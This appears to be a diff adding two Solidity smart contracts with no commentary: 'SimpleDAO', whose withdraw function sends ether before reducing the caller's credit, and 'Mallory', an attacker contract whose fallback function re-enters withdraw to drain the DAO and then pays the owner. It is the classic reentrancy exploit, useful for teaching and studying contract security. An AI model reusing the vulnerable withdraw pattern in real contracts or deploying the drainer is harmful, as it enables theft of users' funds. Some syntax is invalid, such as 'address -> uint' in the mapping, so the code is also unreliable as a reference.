@@ -1,0 +1,38 @@
+
+contract SimpleDAO {
+          mapping (address -> uint) public credit;
+         function donate(address to)
+     {
+         credit[to] += msg.value;
+     } 
+
+     function queryCredit (address to) returns (uint){         return credit[to]; 
+     }
+  
+
+     function withdraw (uint amount) {          if (credit[msg.sender]>= amount) { 
+               msg.sender.call.value(amount)();               credit[msg.sender]-=amount;  }
+     }
+    
+}
+
+
+
+contract Mallory{      
+      address owner;
+      SimpleDAO public dao = SimpleDAO(354); 
+     
+      function Mallory(){owner = msg.sender; } 
+      function() { 
+          dao.withdraw(dao.queryCredit(this)); 
+      } 
+      function getJackpot(){ 
+          owner.send(this.balance); 
+      }
+
+      }
+
+
+
+
+
